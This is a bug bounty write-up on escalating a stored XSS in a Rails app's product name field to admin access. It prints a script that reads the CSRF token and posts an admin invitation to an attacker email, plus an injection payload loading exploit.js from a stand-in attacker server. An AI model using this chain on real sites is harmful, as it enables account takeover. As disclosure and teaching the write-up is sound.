---
title: "Privilege Escalation using XSS"
date: 2021-03-30
tags: [BugBounty, BugBountyTips, Cross Site Scripting, XSS, Privilege Escalation, Ruby On Rails, Rails]
excerpt: "Privilege Escalation using XSS"
header:
  image: "assets/images/BugBountyImages/xss_csrf/pe-via-xss.png"

---

Greetings everyone, this blog is about the privilege escalation issue I identified using XSS vulnerability.

So first let's jump into the functionality of the application. the application had a manager role and admin role and both admin and manager had access to the product section. Both the admin and manager were able to see the product name. 

While testing this functionality I tested the product name and it appears to be vulnerable to Cross-Site scripting attack using the simple payload `<script>alert(1)</script>`. This cross-site scripting attack was triggering in both the manager and admin section.

There was another functionality on admin sections that allows an admin to invite another user into the Organisation.  So, this functionality became my target and my end goal to exploit this cross-site scripting and invite a new user using that invitation functionality. 

Problem was, the request had a CSRF token in the POST request. To exploit this first I had to extract the CSRF token from the source and then I had to send the malicious payload to the admin user.

Getting the `authenticity_token` from the source code first:

```jsx
authenticity_token = document.getElementsByName("authenticity_token")[0].value
```

then send XHR request of the invitation functionality using the latest fetched `authenticity_token` token

```jsx
POST_URL = "https://redacted/users/invite"
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
   console.log(xhr.responseText);
   }
}

xhr.send("utf8=%E2%9C%93&authenticity_token="+authenticity_token+"&email=attacker@gmail.com&role=admin&commit=Invite+User");
```

Final payload looks like:

```jsx
"><script src="http://attack-server.com/exploit.js"></script>
```

Once this payload gets triggers in the admin production section, a new user invitation with an admin role will be sent to the attacker's email address, now the attacker can signup as admin.

The program accepted this vulnerability as a P2 ( High Risk ) vulnerability and fixed it by sanitizing the product name parameter.